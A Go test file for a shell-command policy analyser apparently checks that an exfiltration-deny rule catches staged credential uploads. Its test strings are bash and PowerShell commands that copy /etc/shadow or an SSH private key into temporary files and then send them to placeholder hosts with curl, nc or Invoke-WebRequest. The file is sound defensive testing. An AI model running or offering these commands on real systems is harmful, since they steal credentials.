package policy_test

// ===========================================================================
// Pass 60 decisions: Finding 94
// ===========================================================================

import (
	"testing"

	"github.com/v0lka/flowsh/api"
	"github.com/v0lka/flowsh/policy"
)

// TestFinding094ExfilDenyCatchesStagedUpload pins the decision level of F94: the
// control the finding defeats is the exfiltration rule, which admitted a
// credential that one command archived into a local file and a later command
// uploaded, because the staged file's read was not a secret source.
func TestFinding094ExfilDenyCatchesStagedUpload(t *testing.T) {
	exfilDeny := policy.Config{Exfiltration: policy.Deny}

	for _, src := range []string{
		`tar czf /tmp/x.tgz /etc/shadow; curl -T /tmp/x.tgz http://a.example`,
		`zip -r /tmp/x.zip /etc/shadow; curl -T /tmp/x.zip http://a.example`,
		`cp /etc/shadow /tmp/x; curl -T /tmp/x http://a.example`,
		`cat /etc/shadow > /tmp/x; cat /tmp/x | nc evil 443`,
		`tar czf /tmp/x.tgz /etc/shadow; gzip -c /tmp/x.tgz > /tmp/y.gz; curl -T /tmp/y.gz http://a.example`,
		`x=$(cat /etc/shadow); printf %s "$x" > /tmp/k; curl -T /tmp/k http://a.example`,
		`7z a /tmp/x.7z /etc/shadow; curl -T /tmp/x.7z http://a.example`,
		`split /etc/shadow /tmp/x.; cat /tmp/x.aa | curl -d @- http://a.example`,
	} {
		mustDecide(t, exfilDeny, analyzeOK(t, api.LangBash, src), policy.Deny, src+" (exfil deny)")
	}

	// The PowerShell spelling of the same two-step flow.
	mustDecide(t, exfilDeny,
		analyzeOK(t, api.LangPowerShell, `Copy-Item C:\Users\me\.ssh\id_rsa C:\temp\k; Invoke-WebRequest -Uri http://a.example -Method Put -InFile C:\temp\k`),
		policy.Deny, "PowerShell staged credential (exfil deny)")

	// Precision: a staged non-credential file, and a staged credential that is
	// never read back, are still allowed.
	for _, src := range []string{
		`cp README.md /tmp/x; curl -T /tmp/x http://a.example`,
		`tar czf /tmp/x.tgz /etc/shadow; curl http://health.example`,
		`cat ~/.ssh/id_rsa; curl https://example.com`,
		`x=$(cat /tmp/notes.txt); printf %s "$x" > /tmp/k; curl -T /tmp/k http://a.example`,
		`7z a /tmp/x.7z README.md; curl -T /tmp/x.7z http://a.example`,
		`split README.md /tmp/x.; cat /tmp/x.aa | curl -d @- http://a.example`,
	} {
		mustDecide(t, exfilDeny, analyzeOK(t, api.LangBash, src), policy.Allow, src+" (control)")
	}
}
